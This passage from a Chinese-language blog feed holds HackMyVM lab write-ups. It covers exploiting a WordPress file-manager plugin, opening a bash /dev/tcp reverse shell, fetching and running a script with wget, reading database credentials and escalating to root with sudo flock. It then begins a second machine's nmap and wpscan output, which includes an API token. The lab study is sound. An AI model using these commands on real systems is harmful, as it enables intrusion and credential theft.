id&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ <span class="operator">==</span> &#x27;<span class="params">__main__&#x27;:</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> len(sys.argv) <span class="operator">!=</span> <span class="number">3</span>:</span><br><span class="line">		help()</span><br><span class="line"></span><br><span class="line">	<span class="params">else:</span></span><br><span class="line">		exploit()                                                                                                                     </span><br></pre></td></tr></table></figure></div>
<p>å¯ä»¥ç›´æ¥åˆ°webè®¿é—®è·¯å¾„&#x2F;&#x2F;wp-content&#x2F;plugins&#x2F;wp-file-manager&#x2F;lib&#x2F;files&#x2F;shell.php<br>åé¢?cmd&#x3D; ä¼ å…¥è¦æ‰§è¡Œçš„å‘½ä»¤ä¹Ÿå¯ä»¥</p>
<p>cmdä¼ å…¥å‘½ä»¤ ç„¶åæ‰§è¡Œ</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="keyword">python3</span> <span class="number">51224</span>.<span class="keyword">py</span>               </span><br><span class="line"></span><br><span class="line">[*] Uso: <span class="keyword">python3</span> <span class="number">51224</span>.<span class="keyword">py</span> <span class="string">&quot;url&quot;</span> <span class="string">&quot;comando&quot;</span></span><br><span class="line">[!] Ejemplo: <span class="keyword">python3</span> <span class="number">51224</span>.<span class="keyword">py</span> http://wordpress.local/ id</span><br><span class="line">                                                                                                                     </span><br><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# <span class="keyword">python3</span> <span class="number">51224</span>.<span class="keyword">py</span> http://<span class="number">192.168</span>.<span class="number">240.139</span>/secret id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br></pre></td></tr></table></figure></div>
<p>æ ¹æ®ä½¿ç”¨ç¤ºä¾‹çŸ¥é“äº†ç”¨æ³• æŠŠidæ”¹æˆè¦æ‰§è¡Œçš„å‘½ä»¤<br>ç„¶ååå¼¹shell  ä½†æ˜¯è¿™é‡Œç”¨ncæ²¡æœ‰åŠæ³•åå¼¹å›shell<br>ç”¨å¦å¤–ä¸€ç§æ–¹å¼  å†™ä¸€ä¸ªreverse.sh</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="APACHE"><figure class="iseeu highlight /apache"><table><tr><td class="code"><pre><span class="line"><span class="attribute">bash</span> -i &gt;&amp; /dev/tcp/<span class="number">192.168.240.83</span>/<span class="number">1234</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>   </span><br></pre></td></tr></table></figure></div>
<p>å¯åŠ¨httpæœåŠ¡ è®©webé‚£è¾¹å¯ä»¥æ¥å—åˆ°æœ¬æœºçš„æ–‡ä»¶</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="COFFEESCRIPT"><figure class="iseeu highlight /coffeescript"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€<span class="comment"># python3 -m http.   server                                                              </span></span><br><span class="line">Serving HTTP <span class="literal">on</span> <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span> port <span class="number">8000</span> (http:<span class="regexp">//0.0.0.0:8000/</span>) ...</span><br></pre></td></tr></table></figure></div>
<p>åœ¨webç«¯è¾“å…¥</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">?<span class="attribute">cmd</span>=wget 192.168.240.83:8000/reverse.sh</span><br><span class="line">?<span class="attribute">cmd</span>=bash reverse.sh</span><br></pre></td></tr></table></figure></div>
<p>æ‹¿åˆ°shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="VIM"><figure class="iseeu highlight /vim"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~/tmp]</span><br><span class="line">â””â”€# nc -<span class="keyword">lp</span> <span class="number">1234</span></span><br><span class="line">id</span><br><span class="line">bash: cannot <span class="keyword">set</span> terminal process group (<span class="number">650</span>): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: <span class="keyword">no</span> job control in this <span class="keyword">shell</span></span><br><span class="line">&lt;ress/<span class="keyword">wp</span>-content/plugins/<span class="keyword">wp</span>-<span class="keyword">file</span>-manager/lib/<span class="keyword">files</span>$ id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br><span class="line">&lt;ress/<span class="keyword">wp</span>-content/plugins/<span class="keyword">wp</span>-<span class="keyword">file</span>-manager/lib/<span class="keyword">files</span>$ </span><br></pre></td></tr></table></figure></div>
<h1 id="ææƒ"><a href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h1><p>æ ¹æ®æœ€å¼€å§‹çš„æç¤ºæœ‰ä¿¡æ¯çš„phpæ–‡ä»¶ï¼Œæ‰¾åˆ°è¿™ä¸ªæ–‡ä»¶ï¼ŒæŸ¥çœ‹å†…å®¹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@vulny</span><span class="symbol">:/etc/wordpress</span><span class="variable">$ </span>cat config-<span class="number">192.168</span>.<span class="number">1.122</span>.php</span><br><span class="line">cat config-<span class="number">192.168</span>.<span class="number">1.122</span>.php</span><br><span class="line">&lt;<span class="string">?p</span>hp</span><br><span class="line">define(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_PASSWORD&#x27;</span>, <span class="string">&#x27;myfuckingpassword&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;DB_COLLATE&#x27;</span>, <span class="string">&#x27;utf8_general_ci&#x27;</span>);</span><br><span class="line">define(<span class="string">&#x27;WP_CONTENT_DIR&#x27;</span>, <span class="string">&#x27;/usr/share/wordpress/wp-content&#x27;</span>);</span><br><span class="line"><span class="string">?&gt;</span></span><br><span class="line">www-data<span class="variable">@vulny</span><span class="symbol">:/etc/wordpress</span><span class="variable">$ </span></span><br></pre></td></tr></table></figure></div>
<p>è¿™é‡Œæœ‰æ•°æ®åº“å¯†ç  myfuckingpassword<br>çœ‹äº†wp åœ¨å»&#x2F;usr&#x2F;share&#x2F;wordpress&#x2F;wp-config.phpä¸­æ‰¾å†…å®¹</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">www-data@vulny:/usr/share/wordpress$ cat wp-config.php</span><br><span class="line">cat wp-config.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/***</span></span><br><span class="line"><span class="comment"> * WordPress&#x27;s Debianised default master config file</span></span><br><span class="line"><span class="comment"> * Please do NOT edit and learn how the configuration works in</span></span><br><span class="line"><span class="comment"> * /usr/share/doc/wordpress/README.Debian</span></span><br><span class="line"><span class="comment"> ***/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Look up a host-specific config file in</span></span><br><span class="line"><span class="comment"> * /etc/wordpress/config-&lt;host&gt;.php or /etc/wordpress/config-&lt;domain&gt;.php</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="variable">$debian_server</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/:.*/&#x27;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_HOST&#x27;</span>]);</span><br><span class="line"><span class="variable">$debian_server</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/[^a-zA-Z0-9.\-]/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$debian_server</span>);</span><br><span class="line"><span class="variable">$debian_file</span> = <span class="string">&#x27;/etc/wordpress/config-&#x27;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="variable">$debian_server</span>).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"><span class="comment">/* Main site in case of multisite with subdomains */</span></span><br><span class="line"><span class="variable">$debian_main_server</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/^[^.]*\./&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="variable">$debian_server</span>);</span><br><span class="line"><span class="variable">$debian_main_file</span> = <span class="string">&#x27;/etc/wordpress/config-&#x27;</span>.<span class="title function_ invoke__">strtolower</span>(<span class="variable">$debian_main_server</span>).<span class="string">&#x27;.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$debian_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$debian_file</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DEBIAN_FILE&#x27;</span>, <span class="variable">$debian_file</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">file_exists</span>(<span class="variable">$debian_main_file</span>)) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="variable">$debian_main_file</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DEBIAN_FILE&#x27;</span>, <span class="variable">$debian_main_file</span>);</span><br><span class="line">&#125; <span class="keyword">elseif</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;/etc/wordpress/config-default.php&quot;</span>)) &#123;</span><br><span class="line">    <span class="keyword">require_once</span>(<span class="string">&quot;/etc/wordpress/config-default.php&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DEBIAN_FILE&#x27;</span>, <span class="string">&quot;/etc/wordpress/config-default.php&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;HTTP/1.0 404 Not Found&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Neither &lt;b&gt;<span class="subst">$debian_file</span>&lt;/b&gt; nor &lt;b&gt;<span class="subst">$debian_main_file</span>&lt;/b&gt; could be found. &lt;br/&gt; Ensure one of them exists, is readable by the webserver and contains the right password/username.&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* idrinksomewater */</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* Default value for some constants if they have not yet been set</span></span><br><span class="line"><span class="comment">   by the host-specific config files */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;ABSPATH&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;ABSPATH&#x27;</span>, <span class="string">&#x27;/usr/share/wordpress/&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WP_CORE_UPDATE&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_CORE_UPDATE&#x27;</span>, <span class="literal">false</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WP_ALLOW_MULTISITE&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_ALLOW_MULTISITE&#x27;</span>, <span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DB_NAME&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_NAME&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DB_USER&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_USER&#x27;</span>, <span class="string">&#x27;wordpress&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DB_HOST&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;DB_HOST&#x27;</span>, <span class="string">&#x27;localhost&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;WP_CONTENT_DIR&#x27;</span>) &amp;&amp; !<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;DONT_SET_WP_CONTENT_DIR&#x27;</span>))</span><br><span class="line">    <span class="title function_ invoke__">define</span>(<span class="string">&#x27;WP_CONTENT_DIR&#x27;</span>, <span class="string">&#x27;/var/lib/wordpress/wp-content&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Default value for the table_prefix variable so that it doesn&#x27;t need to</span></span><br><span class="line"><span class="comment">   be put in every host-specific config file */</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$table_prefix</span>)) &#123;</span><br><span class="line">    <span class="variable">$table_prefix</span> = <span class="string">&#x27;wp_&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_PROTO&#x27;</span>]) &amp;&amp; <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTP_X_FORWARDED_PROTO&#x27;</span>] == <span class="string">&#x27;https&#x27;</span>)</span><br><span class="line">    <span class="variable">$_SERVER</span>[<span class="string">&#x27;HTTPS&#x27;</span>] = <span class="string">&#x27;on&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(ABSPATH . <span class="string">&#x27;wp-settings.php&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
<p>æœ‰ä¸€ä¸ªæ³¨é‡Š<code>/* idrinksomewater */</code>  è¿™ä¸ª å°±æ˜¯ç”¨æˆ·çš„å¯†ç ï¼Œç”¨æˆ·åœ¨homeç›®å½•æœ‰æ˜¾ç¤ºåç§°<br>æŸ¥çœ‹sudo-l</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> adrian on <span class="symbol">vulny:</span></span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span>\<span class="symbol">:/snap/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> adrian may run the following commands on <span class="symbol">vulny:</span></span><br><span class="line">    (<span class="title class_">ALL</span> : <span class="title class_">ALL</span>) <span class="symbol">NOPASSWD:</span> /usr/bin/flock</span><br></pre></td></tr></table></figure></div>
<p>ç”¨flock ææƒ<br>åœ¨gtfobinsæ‰¾åˆ°ææƒæ–¹æ³•</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> flock -u / /bin/sh</span><br></pre></td></tr></table></figure></div>
<p>è¿™ä¸ªå‘½ä»¤çš„æœ¬æ„æ˜¯ â€œè§£é” &#x2F; ä¹‹åæ‰§è¡Œ &#x2F;bin&#x2F;shâ€ï¼Œä½†ç”±äº flock -u &#x2F; æ²¡æœ‰å®é™…å½±å“ï¼Œå®ƒç›¸å½“äºï¼š<br><code>sudo /bin/sh</code></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sudo</span> /usr/bin/flock / /bin/bash</span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line"><span class="built_in">cat</span> /root/*.txt</span><br><span class="line">HMVididit</span><br></pre></td></tr></table></figure></div>
<p>å®Œæˆ</p>
<p>æ€»ç»“ï¼šæˆ‘é‡åˆ°çš„ä¸€äº›å¡ç‚¹ï¼š1.æœç´¢secretç›®å½•ä¸‹çš„äºŒçº§ç›®å½• 2.æ‰¾åˆ°æ’ä»¶çš„æ¼æ´åˆ©ç”¨è„šæœ¬  3.ç”¨å‡ºäº†nc -eçš„å¦ä¸€ç§æ–¹æ³•åå¼¹shell<br>å­¦ä¹ åˆ°äº†ï¼š 1.<code>python3 -m http.server</code> å¼€å¯ä¸€ä¸ªhttpæœåŠ¡ è®©webå¯ä»¥ç”¨wgetæ¥æ”¶è„šæœ¬  2.reverse.shçš„åˆ©ç”¨ï¼Œæ¥æ”¶ä¹‹åç”¨bashæ‰§è¡Œ 3.wordpressé¢˜ç›®å»&#x2F;usr&#x2F;share&#x2F;wordpress&#x2F;wp-config.phpä¸­çœ‹çœ‹ 4.flockææƒ</p>
]]></content>
      <categories>
        <category>é¶åœº</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
        <tag>HMV</tag>
        <tag>é¶åœº</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-buster</title>
    <url>/posts/7142.html</url>
    <content><![CDATA[<p>HMV-busterå¤ç›˜,ta0ç¥åšçš„é¶æœº</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/67a3428cd0e0a243d4fbf739.png"></p>
<h1 id="ç«¯å£æ‰«æ"><a href="#ç«¯å£æ‰«æ" class="headerlink" title="ç«¯å£æ‰«æ"></a>ç«¯å£æ‰«æ</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># nmap -A 192.168.240.231</span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">05</span> <span class="number">14</span>:<span class="number">48</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">240.231</span> (<span class="number">192.168</span>.<span class="number">240.231</span>)</span><br><span class="line">Host is up (<span class="number">0.0020</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span><span class="operator">+</span>deb10u4 (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> c2:<span class="number">91</span>:d9:a5:f7:a3:<span class="number">98</span>:<span class="number">1</span>f:c1:<span class="number">4</span>a:<span class="number">70</span>:<span class="number">28</span>:aa:ba:a4:<span class="number">10</span> (RSA)</span><br><span class="line">|   <span class="number">256</span> <span class="number">3</span>e:<span class="number">1</span>f:c9:eb:c0:<span class="number">6</span>f:<span class="number">24</span>:<span class="number">06</span>:fc:<span class="number">52</span>:<span class="number">5</span>f:<span class="number">2</span>f:<span class="number">1</span>b:<span class="number">35</span>:<span class="number">33</span>:ec (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> ec:<span class="number">64</span>:<span class="number">87</span>:<span class="number">04</span>:<span class="number">9</span>a:<span class="number">4</span>b:<span class="number">32</span>:fe:<span class="number">2</span>d:<span class="number">1</span>f:<span class="number">9</span>a:b0:<span class="number">81</span>:d3:<span class="number">7</span>c:cf (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    nginx <span class="number">1.14</span>.<span class="number">2</span></span><br><span class="line">| http-robots.<span class="params">txt:</span> <span class="number">1</span> disallowed entry </span><br><span class="line">|_<span class="operator">/</span>wp-admin<span class="symbol">/</span></span><br><span class="line">|<span class="params">_http-server-header:</span> nginx<span class="symbol">/1.14.2</span></span><br><span class="line">|<span class="params">_http-title:</span> bammmmuwe</span><br><span class="line">|<span class="params">_http-generator:</span> WordPress <span class="number">6.7</span>.<span class="number">1</span></span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">6</span>A:<span class="number">4</span>C:<span class="number">9</span>F:<span class="number">02</span>:<span class="number">22</span>:<span class="number">6</span>E (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.05</span> ms <span class="number">192.168</span>.<span class="number">240.231</span> (<span class="number">192.168</span>.<span class="number">240.231</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">15.13</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>å¼€æ”¾80å’Œ22 ç›´æ¥å»webæ‰¾ä¿¡æ¯</p>
<h1 id="webæ¢æµ‹"><a href="#webæ¢æµ‹" class="headerlink" title="webæ¢æµ‹"></a>webæ¢æµ‹</h1><p>è®¿é—®webç«¯ å‘ç°è¿™ä¸ªwebæ˜¯ç”¨çš„wordpress<br><img src="https://pic1.imgdb.cn/item/67a342afd0e0a243d4fbf73c.png"><br>ç”¨wpscan æ‰«ä¸€ä¸‹ç”¨æˆ·å’Œæ’ä»¶ ç„¶åå»çœ‹çœ‹æœ‰æ²¡æœ‰ä»€ä¹ˆæ¼æ´ æ¼«é•¿çš„ç­‰å¾…~</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">â””â”€<span class="comment"># wpscan --api-token r4NahZxa7hHyx6tcZVYdfivP0YNXqmTaJXwqgMatwmE --url http://192.168.240.231/ -e u,ap --plugins-detection aggressive</span></span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        <span class="symbol">/</span> <span class="symbol">/</span>  __ \ <span class="symbol">/</span> ____|</span><br><span class="line">          \ \  <span class="operator">/</span>\  <span class="symbol">/</span> <span class="operator">/</span>| |__) | (___   ___  __ _ _ __ Â®</span><br><span class="line">           \ \<span class="symbol">/</span>  \<span class="symbol">/</span> <span class="symbol">/</span> |  ___<span class="symbol">/</span> \___ \ <span class="symbol">/</span> __|<span class="symbol">/</span> _` | &#x27;_ \</span><br><span class="line">            \  <span class="operator">/</span>\  <span class="symbol">/</span>  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \<span class="symbol">/</span>  \<span class="symbol">/</span>   |_|    |_____<span class="symbol">/</span> \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version <span class="number">3.8</span>.<span class="number">27</span></span><br><span class="line">       Sponsored by Automattic <span class="operator">-</span> https:<span class="operator">//</span>automattic.com<span class="symbol">/</span></span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] <span class="params">URL:</span> http:<span class="operator">//</span><span class="number">192.168</span>.<span class="number">240.231</span><span class="symbol">/</span> [<span class="number">192.168</span>.<span class="number">240.231</span>]</span><br><span class="line">[<span class="operator">+</span>] <span class="params">Started:</span> Wed Feb  <span class="number">5</span> <span class="number">14</span>:<span class="number">57</span>:<span class="number">35</span> <span class="number">2025</span></span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] Headers</span><br><span class="line"> | Interesting <span class="params">Entry:</span> <span class="params">Server:</span> nginx<span class="symbol">/1.14.2</span></span><br><span class="line"> | Found <span class="params">By:</span> Headers (Passive Detection)</span><br><span class="line"> | <span class="params">Confidence:</span> <span class="number">100</span>%</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] robots.txt <span class="params">found:</span> http:<span class="symbol">//192.168.240.231/robots.txt</span></span><br><span class="line"> | Interesting <span class="params">Entries:</span></span><br><span class="line"> |  <span class="operator">-</span> <span class="operator">/</span>wp-admin<span class="symbol">/</span></span><br><span class="line"> |  <span class="operator">-</span> <span class="symbol">/wp-admin/admin-ajax.php</span></span><br><span class="line"> | Found <span class="params">By:</span> Robots Txt (Aggressive Detection)</span><br><span class="line"> | <span class="params">Confidence:</span> <span class="number">100</span>%</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] XML-RPC seems to be <span class="params">enabled:</span> http:<span class="symbol">//192.168.240.231/xmlrpc.php</span></span><br><span class="line"> | Found <span class="params">By:</span> Direct Access (Aggressive Detection)</span><br><span class="line"> | <span class="params">Confidence:</span> <span class="number">100</span>%</span><br><span class="line"> | <span class="params">References:</span></span><br><span class="line"> |  <span class="operator">-</span> http:<span class="symbol">//codex.wordpress.org/XML-RPC_Pingback_API</span></span><br><span class="line"> |  <span class="operator">-</span> https:<span class="operator">//</span>www.rapid7.com<span class="operator">/</span>db<span class="operator">/</span>modules<span class="operator">/</span>auxiliary<span class="operator">/</span>scanner<span class="operator">/</span>http<span class="operator">/</span>wordpress_ghost_scanner<span class="symbol">/</span></span><br><span class="line"> |  <span class="operator">-</span> https:<span class="operator">//</span>www.rapid7.com<span class="operator">/</span>db<span class="operator">/</span>modules<span class="operator">/</span>auxiliary<span class="operator">/</span>dos<span class="operator">/</span>http<span class="operator">/</span>wordpress_xmlrpc_dos<span class="symbol">/</span></span><br><span class="line"> |  <span class="operator">-</span> https:<span class="operator">//</span>www.rapid7.com<span class="operator">/</span>db<span class="operator">/</span>modules<span class="operator">/</span>auxiliary<span class="operator">/</span>scanner<span class="operator">/</span>http<span class="operator">/</span>wordpress_xmlrpc_login<span class="symbol">/</span></span><br><span class="line"> |  <span class="operator">-</span> https:<span class="operator">//</span>www.rapid7.com<span class="operator">/</span>db<span class="operator">/</span>modules<span class="operator">/</span>auxiliary<span class="operator">/</span>scanner<span class="operator">/</span>http<span class="operator">/</span>wordpress_pingback_access<span class="symbol">/</span></span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] WordPress readme <span class="params">found:</span> http:<span class="symbol">//192.168.240.231/readme.html</span></span><br><span class="line"> | Found <span class="params">By:</span> Direct Access (Aggressive Detection)</span><br><span class="line"> | <span class="params">Confidence:</span> <span class="number">100</span>%</span><br><span class="line"></span><br><span class="line">[<span class="operator">+</span>] The external WP-Cron seems to be <span class="params">enabled:</span> http:<span class="symbol">//192.168.240.231/wp-cron.php</span></span><br><span class="line"> | Found <span class="params">By:</span> Direct Access (Aggressive Detection)</span><br><span class="line"> | <span class="params">Confidence:</span> <span class="number">60</span>%</span><br><span class="line"> | <span class="params">References:</span></span><br><span class="line"> |  <span class="operator">-</span> https:<span class="symbol">//www.iplocation.net/defend-wordpress-from-ddos</span></span><br><span class="line"> |  <span class="operator">-</span> https:<span class="symbol">//github.com/wpscanteam/wpscan/issues/1299</span></span><br><span 